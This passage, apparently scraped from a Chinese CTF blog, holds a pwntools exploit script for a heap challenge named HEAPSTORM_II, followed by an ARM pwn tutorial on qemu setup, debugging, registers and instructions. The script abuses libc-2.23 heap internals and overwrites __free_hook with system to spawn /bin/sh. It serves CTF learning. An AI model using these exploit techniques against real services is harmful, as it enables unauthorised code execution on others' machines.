class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;./pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">p=process(filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote()</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Command: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Size: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Command: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Size: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Content: &#x27;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Command: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Command: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x508</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x508</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x4f0</span>+p64(<span class=\"number\">0x500</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)<span class=\"comment\">#edit the pre_size of fake chunk </span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#reset the pre_inuse and pre_size of chunk2</span></span><br><span class=\"line\"><span class=\"comment\">#reset the size of chunk1 by null of byte</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x18</span>-<span class=\"number\">12</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#malloc 0x500</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x4d8</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#the pre_size of chunk2 is 0x510 ,pre_inuse is 0 so chunk 2 will merge with chunk1(chunk2-pre_size==chunk1)</span></span><br><span class=\"line\"><span class=\"comment\">#now we achieve chunk overlapping</span></span><br><span class=\"line\"><span class=\"comment\">#chunk7-&gt;heap_base+0x50 can control 0x4d8</span></span><br><span class=\"line\"><span class=\"comment\">#now we use malloc to get the chunk</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x4e8</span>)<span class=\"comment\">#2 can be control by chunk7(chunk7-&gt;chunk2-0x10)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#do again by chunk4</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x4f0</span>+p64(<span class=\"number\">0x500</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,payload)<span class=\"comment\">#edit the pre_size of fake chunk </span></span><br><span class=\"line\">free(<span class=\"number\">4</span>)<span class=\"comment\">#reset the pre_inuse and pre_size of chunk2</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x18</span>-<span class=\"number\">12</span>)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x4d8</span>)<span class=\"comment\">#8</span></span><br><span class=\"line\"><span class=\"comment\">#chunk8-&gt;heap_base+0x5a0 can control 0x4d8</span></span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">free(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>)<span class=\"comment\">#4 make a smaller chunk</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x4e8</span>)<span class=\"comment\">#2 put the smaller chunk into large bin(size=0x4e1) control by chunk8</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#put the bigger chunk into unsorted bin(size=0x4f1) controlled by chunk7</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#reset the bk of unsorted bin chunk, bk and bk_nextsize of large bin chunk</span></span><br><span class=\"line\">fake=<span class=\"number\">0x13370800</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x4f1</span>)+p64(<span class=\"number\">0</span>)+p64(fake)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,payload)<span class=\"comment\">#unsort bin chunk&#x27;s bk</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x4e1</span>)+p64(<span class=\"number\">0</span>)+p64(fake+<span class=\"number\">0x8</span>)+p64(<span class=\"number\">0</span>)+p64(fake-<span class=\"number\">0x18</span>-<span class=\"number\">0x5</span>)</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,payload)<span class=\"comment\">#large bin chunk&#x27;s bk and bk_nextsize</span></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>)<span class=\"comment\">#2 malloc 0x13370800</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#reset r1~r4 and leak libc</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x13377331</span>)+p64(<span class=\"number\">0x13370800</span>)+p64(<span class=\"number\">0x70</span>)<span class=\"comment\">#reset chunk0=&gt;heaparray</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)<span class=\"comment\">#get show</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;]: &quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;HEAPSTORM_II&#x27;</span>)</span><br><span class=\"line\">libcbase=(uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:])^<span class=\"number\">0x13370800</span>)-<span class=\"number\">0x68</span>-<span class=\"number\">0x3c4b10</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overwrite free_hook to get shell</span></span><br><span class=\"line\">free_hook=libcbase+libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">sys_addr=libcbase+libc.sym [<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;free_hook&quot;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x13377331</span>)+p64(<span class=\"number\">0x13370800</span>)+p64(<span class=\"number\">0x70</span>)+p64(free_hook)+p64(<span class=\"number\">0x50</span>)+p64(<span class=\"number\">0x13370850</span>)+p64(<span class=\"number\">0x50</span>)+<span class=\"string\">&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#reset chunk1=&gt;free_hook chunk2=&gt;&quot;/bin/sh&quot;</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"ArmPwn","date":"2023-01-07T02:53:26.000Z","_content":"\nArm架构下的pwn与x86类似，只是用的是RISC的处理器架构，指令集会与x86有较大的差别。Arm广泛地使用在许多嵌入式系统设计。由于节能的特点，ARM处理器非常适用于移动通讯领域，符合其主要设计目标为低耗电的特性。因此我们常用的手机、平板等移动设备都是采用ARM体系架构的，因此CTF中不可避免也会出现ARM架构的pwn题，但是相比x86会简单许多，通常都是普通的栈溢出。\n<!-- more -->\n\n## 环境搭建\n\n本地的机器大多都是`x86`架构的，无法运行`ARM`架构的程序，需要我们通过`qemu`来运行。\n\n### 32位\n\n采用命令`qemu-arm prog_name`运行。\n\n```sh\nqemu-arm -L /usr/arm-linux-gnueabi/ ./prog # 不是hf的\nqemu-arm -L /usr/arm-linux-gnueabihf/ ./prog # hf的\n```\n\n### 64位\n\n采用命令`qemu-aarch64 ./prog`运行。\n\n但对于**动态链接**的程序还是无法正常运行，此时需要安装对应架构的动态链接库才行：（`arm64`和`aarch64`是同一个架构的不同名称）\n\n```sh\nsudo apt search \"libc6\" | grep arm\nsudo apt install libc6-dbg-arm64-cross # 或其他的库\n```\n\n安装完成后在`/usr`目录下会出现`aarch64-linux-gnu`这个文件夹，该文件夹即对应刚安装好的arm64位libc库，之后我们使用下面的命令指定arm程序的动态链接器，即可运行程序，32位类似。\n\n通过`-L `指定libc`qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./prog`\n\n`armel`和`armhf`，这主要是针对浮点计算来区分的，其中`armel (arm eabi little endian)`使用fpu浮点运算单元，但传参还是用**普通寄存器**；`armhf (arm hard float)`也使用fpu浮点运算单元，同时使用fpu中的**浮点寄存器**传参。\n\n`arm64`默认用的是`armhf`，所以也就没有这个后缀，因此**有这个后缀区分的都是指的是32位arm架构**。\n\n### 大端序的arm\n\n采用命令`qemu-armeb`运行。\n\n### 调试\n\n在`qemu`启动程序时通过`-g`指定端口：\n\n```sh\n# qemu-arch -g port -L /usr/arch-lib-dir/ ./prog\nqemu-arm -g 8888 ./typo\n```\n\n利用`gdb-multiarch`连上端口进行调试：\n\n```sh\n$ gdb-multiarch\n......\n......\npwndbg> set architecture arm\nThe target architecture is assumed to be arm\npwndbg> target remote localhost:8888\n```\n\n在`pwntools`中调试的话需要修改下代码：\n\n```py\n p = process([\"qemu-arm\", \"-g\", \"8888\", \"./typo\"])\n```\n\n如果32位遇见这个报错的话：`/lib/ld-linux-armhf.so.3: No such file or directory`\n\n输入命令`sudo apt-get install libc6-armhf-cross`\n\n如果遇见这个报错的话：`Invalid ELF image for this architecture`\n\n说明用的`qemu`架构不对\n\n## 基础知识\n\n### 寄存器\n\n```\n32位：\nR0, R1, R2, R3, R4, R5, R6, R7, R8, R9, R10, R11, R12, R13, R14, R15...\n64位：\nX0, X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, X11, X12, X13, X14, X15...\n```\n\n#### 32位\n\n![arm](./ArmPwn/arm32register)\n\n- `R0~R3`主要用于子程序之间的**参数传递**，剩下的参数**从右向左**依次入栈， 被调用者实现栈平衡，函数的**返回值保存在 `R0`** 中\n- `R4~R11`主要用于**保存局部变量**，但在 Thumb 程序中，通常只能使用`R4~R7`来保存局部变量\n- `R12`用作子程序间scratch 寄存器，即 ip 寄存器\n- `R13`为`SP`，即栈指针。在物理上实际上有两个栈指针：主栈指针(MSP)和进程栈指针(PSP)，一般的进程只有一个栈指针可见。这个也好理解，就好比在x86-64系统中，内核的栈指针和用户进程的栈指针不同一样。\n- `R14`为链接寄存器`LR`，用于保存函数或子程序调用时**返回地址**。在x86-64系统中，函数调用的返回值是保存在子函数栈帧的上面，即`rbp+8`的位置，在ARM系统中，函数调用同样需要将返回地址保存到栈中，因为`LR`在函数返回时会进行自动更新，如果栈中没有返回地址，那么`LR`就不知道要更新成什么值了。\n- `PC`为程序计数器。`PC`的最低有效位（LSB）是一个控制结构，为1时表示进入Thumb状态。当有些时候程序跳转更新PC时需要将新PC值的LSB置1，否则会触发错误异常。这也可以看做是一种程序恶意跳转的保护机制。有时还会将`PC`作为基址访问数据。\n\n除了这些寄存器之外，还有一些特殊寄存器，他们未经过存储器映射,可以使用MSR和MRS等特殊寄存器访问指令来进行访问。\n\n 程序状态寄存器包括以下三个状态寄存器：\n\n- 应用PSR（APSR）\n- 执行PSR（EPSR）\n- 中断PSR（IPSR）\n\n中断/异常屏蔽寄存器：\n\n- PRIMASK\n- FAULTMASK\n- BASEPRI\n- 只有特权状态才可以操作三个寄存器（非特权状态下的写操作会被忽略，读操作返回0）。三个寄存器默认值为0，即屏蔽（禁止异常/中断）不起作用。\n\nCONTROL寄存器\n\n另外，在x86-64架构和ARM架构中都有很多的**浮点数**寄存器，用于进行浮点数计算。在ARM架构中，浮点数寄存器有32个32位寄存器`S0~S31`，其中可以两两组合访问为`D0~D15`，如`S0`和`S1`组合为`D0`。\n\n#### 64位\n\nARMv8有31个通用寄存器`X0-X30`, 还有`SP`、`PC`、`XZR`等寄存器\n\n- `X0-X7` 用于**参数传递**\n- `X9-X15` 在子函数中使用这些寄存器时，直接使用即可, 无需save/restore. 在汇编代码中x9-x15出现的频率极低\n- `X19-X29` 在callee子函数中使用这些寄存器时，需要**先save**这些寄存器，在退出子函数时再resotre\n- `X8, X16-X18, X29, X30` 这些都是特殊用途的寄存器\n    - `X8`： 用于**返回结果**\n    - `X16`、`X17 `：进程内临时寄存器\n    - `X18` ：resrved for ABI\n    - `X29` ：`FP`（frame pointer register）\n    - `X30` ：`LR`，用于保存函数或子程序调用时**返回地址**。\n\n### 指令集\n\n**指令、伪指令**\n\n（汇编）指令： 是机器码的**助记符**，经过汇编器编译后，由CPU执行。\n\n（汇编）伪指令：用来**指导**指令执行，是汇编器的产物，**最终不会生成机器码**。\n\n**有两种不同风格的ARM指令**\n\n1. ARM官方的ARM汇编风格：指令一般用大写。\n\n2. GNU风格的ARM汇编：指令一般用小写。\n\nARM的指令集和x86-64有一些相似之处，但也有一些不同，需要注意的是，**ARM的立即数前面需要加上#标识**，如#0x12345678。下面的指令均为32位系统下的指令。\n\n#### 寄存器与寄存器（立即数）之间的数据传送（`MOV`系列指令）\n\n```asm\nMOV/MOVS reg1, <reg2/imm8>：赋值reg1为reg2/imm8\nMOVW <reg32>, <imm16>：赋值reg32的低16位为imm16\nMOVT <reg32>, <imm16>：赋值reg32的高16位为imm16\nMVN reg1, <reg2>：将reg2的值取反之后赋值给reg1\nLDR <reg32>, =<imm32>：赋值reg32为imm32\n```\n\n#### 存储器传送数据（`LDR`和`STR`系列指令）\n\nARM使用单独的指令集进行寄存器和内存空间的数据交换，其中基址可以选择任意一个通用寄存器或PC寄存器，变址也可以使用任意一个通用寄存器，较x86更加灵活：\n\n`LDR`：加载某一地址的内容到寄存器\n\n`STR`：存储寄存器的内容到某一地址\n\n```asm\nLDRB/LDRH/LDR reg1, [<reg2/PC>, <imm32>]<!>：赋值8/16/32位reg2+imm32地址的数据到reg1，如果指令后面有叹号，表示指令执行后reg2值更新为reg2+imm32，有叹号可等同于 LDRB/LDRH/LDR reg1, [<reg2>], <imm32>，这种形式称为后序指令。\nLDRD reg1, <reg2>, [<reg3/PC>, <imm32>]<!>：赋值64位reg3+imm32地址的数据到reg1和reg2，有叹号可等同于 LDRD reg1, <reg2>, [reg3], <imm32>\nLDRSB/LDRSH reg1, [<reg2/PC>, <imm32>]<!>：有符号传送8/16位reg2+imm32地址的数据到reg1，目标寄存器会进行32位有符号扩展，有叹号可等同于 LDRSB/LDRSH reg1, [<reg2>], <imm32>\nSTRB/STRH/STR reg1, [<reg2>, <imm32>]<!>：保存寄存器reg1的8/16/32位值到reg2+imm32地址，有叹号可等同于 STRB/STRH/STR reg1, [<reg2>], <imm32>\nSTRD reg1, <reg2>, [reg3, <imm32>]<!>：保存寄存器reg1和reg2的64位值值到reg3+imm32地址，有叹号可等同于 STRD reg1, <reg2>, [reg3], <imm32>\nLDRB/LDRH/LDR reg1, [<reg2/PC>, reg3{, LSL <imm>}]：赋值寄存器reg1的值为reg2/PC+(reg3{<<imm})地址处的8/16/32位值\nLDRD reg1, <reg2>, [<reg3/PC>, <reg4-32>{, LSL <imm>}]：赋值寄存器reg1和reg2的值为reg3/PC+(reg4-32{<<imm})地址处的64位值\nSTRB/STRH/STR reg1, [<reg2>, reg3{, LSL <imm>}]：保存寄存器reg1的8/16/32位值到reg2+(reg3{<<imm})地址\nLDMIA/LDMDB reg1<!>, <reg-list>：将reg1地址的值按照顺序保存到reg-list中的寄存器中，如果reg1后有叹号，则在保存值后自动增加（LDMIA）或减少（LDMDB）reg1。如LDMIA R0, {R1-R5}，LDMIA R0, {R1, R3, R6-R9}\nSTMIA/STMDB reg1<!>, <reg-list>：向reg1地址存入寄存器组中的多个字。如果reg1后有叹号，则在保存值后自动增加（STMIA）或减少（STMDB）reg1。\n```\n\n注意：后序指令不能使用PC寻址。\n\n#### 入栈出栈\n\n虽然ARM与x86都使用push和pop指令进行入栈和出栈，但ARM可以实现一条指令多次出入栈。\n\n```asm\nPUSH <reg-list>：将寄存器组中的寄存器值依次入栈，reg-list中可以有PC、LR寄存器。\nPOP <reg-list>：将出栈的值依次存入寄存器组中的寄存器，reg-list中可以有PC、LR寄存器。\n```\n\n\n\n#### 算术运算\n\n不同于x86指令的大多数算术运算使用两个寄存器，ARM指令的算数运算指令**通常包含3个寄存器**，实现运算后的自由赋值而不是x86中必须赋值给目标寄存器且目标寄存器必须参与运算。\n\n第一个操作数用于**保存运算结果**，第二个操作数作**被**加/减/乘/除数，第三个操作数作加/减/乘/除数。\n\n`ADD/C`加/进位加、`SUB/SBC`减/借位减、`MUL`乘、`U/SDIV`无/有符号除法...\n\n```asm\nADD/SUB reg1, <reg2>, <reg3/imm32>：计算<reg2>(+/-)<reg3/imm32>将结果保存到reg3\nADC/SBC reg1, <reg2>, reg3：计算<reg2>(+/-)reg3+(进位/借位)将结果保存到reg3\nADC <reg32>, <imm32>：计算reg32+imm32+进位将结果保存到reg32\nSBC reg1, <reg2>, <imm32>：计算<reg2>-imm32-借位将结果保存到reg1\nRSB reg1, <reg2>, <reg3/imm32>：计算<reg3/imm>-<reg2>将结果保存到reg1\nMUL reg1, <reg2>, reg3：计算<reg2>*reg3将结果保存到reg1\nUDIV/SDIV reg1, <reg2>, reg3：计算<reg2>/reg3（无符号/有符号）将结果保存到reg1，如果除以0，则结果为0\nMLA reg1, <reg2>, reg3, <reg4-32>：计算reg1=<reg2>*reg3+<reg4-32>\nMLS reg1, <reg2>, reg3, <reg4-32>：计算reg1=-<reg2>*reg3-<reg4-32>\n```\n\n#### 移位运算\n\n`ASR`算术右移（补充符号位）、`LSL`逻辑左移、`LSR`逻辑右移、`ROR`循环右移。\n\n如果有两个操作数：第一个操作数用于**保存运算结果**，也是**被移位的数**，第二个操作数是**移动的位数**\n\n如果有三个操作数：第一个操作数用于**保存运算结果**，第二个操作数是**被移位的数**，第三个操作数是**移动的位数**\n\n```asm\nASR/LSL/LSR reg1, <reg2>{, <reg3/imm32>}：如果reg3/imm存在，则表示reg1=<reg2>(>>/<<)<reg3/imm32>，否则表示reg1=reg1(>>/<<)<reg2>（算数右移、逻辑左移、逻辑右移）\nROR reg1, <reg2>{, reg3}：如果reg3存在，则表示reg1=<reg2>(>>)reg3，否则表示reg1=reg1(>>)<reg2>（循环右移）\n```\n\n#### 数据取反\n\n将寄存器中的值按字节进行取反。\n\n```asm\nREV reg1, reg2：将reg2中的4字节数据按字节反转后赋值给reg1（reg2值不变），原先第0，1，2，3字节的内容被换到了第3，2，1，0字节。\nREV16 reg1, reg2：将reg2中的4字节以字单位分为高字和低字分别进行反转后赋值给reg1（reg2值不变），原先第0，1，2，3字节的内容被换到了第1，0，3，2字节。\nREVSH reg1, reg2：将reg2中的低2字节反转后有符号扩展赋值给reg1\nREVH reg1, reg2：REV指令的16位表示，只反转低2字节。\n```\n\n#### 位域操作\n位域操作允许机器指令对寄存器中的特定位进行处理，在x86中好像是也有这样的指令，只是使用频率太低。\n\n```asm\nBFD reg1, #lsb, #width：将reg1中从第lsb位开始的连续width位清零。\nBFI reg1, reg2, #lsb, #width：将reg2中最低width位复制到reg1中从lsb位开始的连续width位。\nCLZ reg1, reg2：计算reg2中高位0的个数并赋值给reg1，多用于浮点数计算。\nRBIT reg1, reg2：反转reg2寄存器中的所有位并赋值给reg1。\nSBFX/UBFX reg1, reg2, #lsb, #width：取reg2中从第lsb位开始的连续width位并有/无符号扩展，赋值给reg1。\n```\n\n#### 比较和测试指令\n与x86使用cmp指令和test指令相似，ARM也有关于比较和测试的指令，且实现原理基本相同。\n\n```asm\nCMP reg1, reg2/imm：比较两个寄存器或寄存器与立即数，更新标志位APSR。\nCMN reg1, reg2/imm：比较reg1和-reg2或-imm，更新标志位APSR。\nTST reg1, reg2/imm：参照x86的test指令，相与测试，更新N（负数位）和Z（零）标志\nTEQ reg1, reg2/imm：异或测试，更新N和Z标志\n```\n\n#### 跳转指令\n\n`B`系列的位跳转指令，`BL`相当于`call`。\n\n```asm\nB/B.W <label>：无条件跳转到指定位置，B.W跳转范围更大。\nBX reg：寄存器跳转。\nBL <label> / BLX reg：跳转到指定位置/寄存器值，且将返回地址保存到LR寄存器中，类比x86的call指令。一般在函数开头都会首先将BL寄存器的值保存到栈中便于返回时获取。\n条件跳转指令族：类比x86指令：\nBEQ == je\nBNE == jne\nBCS/BHS == jc（进位标志为1，可表示无符号大于等于）\nBCC/BLO == jnc（进位标志为0，可表示无符号小于）\nBMI == js（负数标志为1）\nBPL == jns（负数标志为0）\nBVS == jo（溢出标志为1）\nBVC == jno（溢出标志为0）\nBHI == ja（无符号大于）\nBLS == jbe（无符号小于等于）\nBGE == jge（有符号大于等于）\nBLE == jle（有符号小于等于）\nBGT == jg（有符号大于）\nBLT == jl（有符号小于）\nCBZ/CBNZ reg, <label>：比较寄存器的值为0/不为0时跳转（只支持前向跳转）\n```\n\n## 解题技巧\n\n1. arm pwn程序在IDA反汇编后通常都是一大堆sub函数，有许多常用的函数都没有符号，这时**不要硬逆**。arm程序逻辑较为简单，可通过**运行**大致猜测是什么函数。**（三分逆，七分猜**\n1. 栈溢出时覆盖`LR`在栈上的位置，并通过劫持`PC`不断控制执行流。\n1. 